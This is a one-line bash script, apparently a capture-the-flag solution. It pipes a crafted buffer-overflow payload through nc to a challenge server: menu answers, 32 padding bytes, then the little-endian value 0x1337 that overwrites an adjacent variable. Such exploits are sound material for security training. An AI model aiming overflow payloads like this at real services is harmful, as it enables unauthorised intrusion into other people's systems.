#!/bin/bash

python -c "import sys; sys.stdout.buffer.write(b'1\n1\n1\n' + b'A' * 32 + b'\x37\x13\x00\x00\n' +  b'2\n')" | nc challenges.sshuzl.de 12376

